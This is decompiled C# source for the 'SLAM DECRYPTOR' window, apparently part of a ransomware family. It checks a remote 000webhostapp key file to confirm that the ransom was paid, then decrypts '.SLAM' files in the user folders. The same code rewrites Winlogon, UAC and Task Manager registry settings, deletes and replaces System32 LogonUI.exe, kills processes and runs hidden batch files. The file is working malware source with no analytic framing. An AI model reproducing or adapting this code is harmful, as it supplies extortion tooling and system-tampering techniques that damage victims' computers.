using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace WindowsFormsApp1;

public class Form2 : Form
{
	private string userName = Environment.UserName;

	private string userDir = "C:\\Users\\";

	internal static string variableCompartida;

	internal static string variableCompartida2;

	internal static string variableCompartida3;

	internal static string variableCompartida4;

	private bool logon_check = true;

	public string abc;

	public string exit;

	private TextBox textBox1;

	private Button button1;

	private TextBox textBox2;

	private Button button2;

	private Label label1;

	private Button button3;

	private Timer timer1;

	private IContainer components;

	private Label label2;

	private Timer timer2;

	private Timer timer3;

	private Timer timer4;

	private Timer timer5;

	public Form2()
	{
		InitializeComponent();
	}

	public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		using Stream stream = callingAssembly.GetManifestResourceStream(nameSpace + "." + ((internalFilePath == "") ? "" : (internalFilePath + ".")) + resourceName);
		using BinaryReader binaryReader = new BinaryReader(stream);
		using FileStream output = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate);
		using BinaryWriter binaryWriter = new BinaryWriter(output);
		binaryWriter.Write(binaryReader.ReadBytes((int)stream.Length));
	}

	public byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	public void DecryptDirectory(string location)
	{
		try
		{
			string password = variableCompartida;
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (extension == ".SLAM")
				{
					DecryptFile(files[i], password);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				DecryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public void DecryptFile(string file, string password)
	{
		try
		{
			byte[] bytesToBeDecrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = AES_Decrypt(bytesToBeDecrypted, bytes);
			File.WriteAllBytes(file, bytes2);
			string extension = Path.GetExtension(file);
			string destFileName = file.Substring(0, file.Length - extension.Length);
			File.Move(file, destFileName);
		}
		catch (Exception)
		{
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
	}

	private void Form1_Load(object sender, EventArgs e)
	{
	}

	private void Form1_Load_1(object sender, EventArgs e)
	{
		if (File.Exists("C:\\temp\\boot.bin"))
		{
			string text = File.ReadAllText("C:\\temp\\boot.bin");
			((Control)label2).set_Text(text);
			File.Delete("C:\\temp\\boot.bin");
		}
	}

	private void button2_Click(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_027d: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("espere por favor, este proceso puede tardar varios minutos");
		try
		{
			WebClient webClient = new WebClient();
			webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
			Stream stream = webClient.OpenRead("http://anmodi.000webhostapp.com/slam/key.txt");
			StreamReader streamReader = new StreamReader(stream);
			string text = streamReader.ReadToEnd();
			stream.Close();
			streamReader.Close();
			if (text.Contains(variableCompartida2))
			{
				DecryptDirectory("C:\\temp\\data\\LogonUI.exe");
				variableCompartida4 = "1";
				MessageBox.Show("pago realizado correctamente");
				string path = "C:\\temp\\boot.bin";
				File.WriteAllText(path, variableCompartida3, Encoding.Default);
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey.SetValue("DisableTaskMgr", "", RegistryValueKind.String);
				RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
				registryKey2.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
				RegistryKey registryKey3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey3.SetValue("EnableLUA", "1", RegistryValueKind.String);
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				string location = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
				string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
				string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
				string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
				string folderPath5 = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
				string location2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "3D Objects");
				string location3 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "OneDrive");
				Process[] array = null;
				array = Process.GetProcessesByName("Logon_overwriter");
				Process[] array2 = array;
				foreach (Process process in array2)
				{
					process.Kill();
				}
				DecryptDirectory(folderPath);
				DecryptDirectory(location);
				DecryptDirectory(folderPath2);
				DecryptDirectory(folderPath3);
				DecryptDirectory(folderPath4);
				DecryptDirectory(folderPath5);
				DecryptDirectory(location2);
				DecryptDirectory(location3);
				DecryptDirectory("C:\\temp\\data");
				Process[] array3 = null;
				array3 = Process.GetProcessesByName("cmd");
				Process[] array4 = array3;
				foreach (Process process2 in array4)
				{
					process2.Kill();
				}
				Process.Start("C:\\temp\\boot.exe");
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = "C:\\temp\\1.bat";
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo);
				Process[] array5 = null;
				array5 = Process.GetProcessesByName("WindowsFormsApp1");
				Process[] array6 = array5;
				foreach (Process process3 in array6)
				{
					process3.Kill();
				}
			}
			else
			{
				MessageBox.Show("todavia no has realizado el pago, no tienes conexion a internet o el servidor no se a actualizado. intentalo mas tarde");
			}
		}
		catch (Exception)
		{
		}
	}

	private void Form2_FormClosing(object sender, FormClosingEventArgs e)
	{
	}

	private void button3_Click(object sender, EventArgs e)
	{
		((Control)this).Hide();
	}

	public void textBox2_TextChanged(object sender, EventArgs e)
	{
	}

	private void timer1_Tick_1(object sender, EventArgs e)
	{
		if (!NetworkInterface.GetIsNetworkAvailable())
		{
			((Form)this).Close();
		}
	}

	private void timer2_Tick(object sender, EventArgs e)
	{
		try
		{
			if (File.Exists("C:\\Windows\\System32\\LogonUI.exe"))
			{
				File.Delete("C:\\Windows\\System32\\LogonUI.exe");
				return;
			}
			timer3.Start();
			timer2.Stop();
		}
		catch (Exception)
		{
		}
	}

	private void timer3_Tick(object sender, EventArgs e)
	{
		try
		{
			File.Copy("C:\\temp\\data\\LogonUI.exe", "C:\\Windows\\System32\\LogonUI.exe", overwrite: true);
			if (File.Exists("C:\\Windows\\System32\\LogonUI.exe"))
			{
				timer3.Stop();
				return;
			}
			File.Copy("C:\\temp\\data\\LogonUI.exe", "C:\\Windows\\System32\\LogonUI.exe", overwrite: true);
			exit += "1";
		}
		catch (Exception)
		{
		}
	}

	private void timer4_Tick(object sender, EventArgs e)
	{
		try
		{
			if (exit == "2")
			{
				Process[] array = null;
				array = Process.GetProcessesByName("WindowsFormsApp1");
				Process[] array2 = array;
				foreach (Process process in array2)
				{
					process.Kill();
				}
			}
		}
		catch (Exception)
		{
		}
	}

	private void timer5_Tick(object sender, EventArgs e)
	{
		if (Form3.variableCompartida == "español")
		{
			((Control)label1).set_Text("REVISA SI HAS REALIZADO EL PAGO");
			((Control)button3).set_Text("salir");
		}
		if (Form3.variableCompartida == "ingles")
		{
			((Control)label1).set_Text("CHECK IF PAYMENT HAS BEEN MADE");
			((Control)button3).set_Text("exit");
		}
		if (Form3.variableCompartida == "chino")
		{
			((Control)label1).set_Text("检查你是否已经支付");
			((Control)button3).set_Text("退出");
		}
		if (Form3.variableCompartida == "ruso")
		{
			((Control)label1).set_Text("ПРОВЕРИТЬ, ЧТО ВЫ ПРОИЗВЕЛИ ОПЛАТУ");
			((Control)button3).set_Text("выход");
		}
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Expected O, but got Unknown
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_009c: Expected O, but got Unknown
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ad: Expected O, but got Unknown
		//IL_0579: Unknown result type (might be due to invalid IL or missing references)
		//IL_0583: Expected O, but got Unknown
		components = new Container();
		textBox1 = new TextBox();
		button1 = new Button();
		textBox2 = new TextBox();
		button2 = new Button();
		label1 = new Label();
		button3 = new Button();
		timer1 = new Timer(components);
		label2 = new Label();
		timer2 = new Timer(components);
		timer3 = new Timer(components);
		timer4 = new Timer(components);
		timer5 = new Timer(components);
		((Control)this).SuspendLayout();
		((Control)textBox1).set_Location(new Point(210, 253));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(369, 26));
		((Control)textBox1).set_TabIndex(0);
		((Control)button1).set_Location(new Point(366, 337));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(1);
		((Control)button1).set_Text("button1");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)textBox2).set_Location(new Point(47, 32));
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(370, 26));
		((Control)textBox2).set_TabIndex(0);
		((Control)textBox2).set_Visible(false);
		((Control)textBox2).add_TextChanged((EventHandler)textBox2_TextChanged);
		((ButtonBase)button2).set_FlatStyle((FlatStyle)0);
		((Control)button2).set_ForeColor(Color.Red);
		((Control)button2).set_Location(new Point(161, 76));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(127, 62));
		((Control)button2).set_TabIndex(1);
		((Control)button2).set_Text("OK");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)label1).set_Anchor((AnchorStyles)14);
		((Control)label1).set_ForeColor(Color.Red);
		((Control)label1).set_Location(new Point(81, 9));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(299, 20));
		((Control)label1).set_TabIndex(13);
		((Control)label1).set_Text("REVISA SI HAS REALIZADO EL PAGO");
		label1.set_TextAlign((ContentAlignment)32);
		((ButtonBase)button3).set_FlatStyle((FlatStyle)0);
		((Control)button3).set_ForeColor(Color.Red);
		((Control)button3).set_Location(new Point(12, 130));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(70, 30));
		((Control)button3).set_TabIndex(3);
		((Control)button3).set_Text("salir");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button3).add_Click((EventHandler)button3_Click);
		timer1.set_Enabled(true);
		timer1.set_Interval(1);
		timer1.add_Tick((EventHandler)timer1_Tick_1);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(419, 97));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(51, 20));
		((Control)label2).set_TabIndex(14);
		((Control)label2).set_Text("label2");
		((Control)label2).set_Visible(false);
		timer2.set_Interval(1);
		timer2.add_Tick((EventHandler)timer2_Tick);
		timer3.set_Interval(1);
		timer3.add_Tick((EventHandler)timer3_Tick);
		timer4.set_Interval(1);
		timer4.add_Tick((EventHandler)timer4_Tick);
		timer5.set_Enabled(true);
		timer5.set_Interval(1);
		timer5.add_Tick((EventHandler)timer5_Tick);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(471, 172));
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Form)this).set_FormBorderStyle((FormBorderStyle)3);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form2");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("SLAM DECRYPTOR");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form2_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load_1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
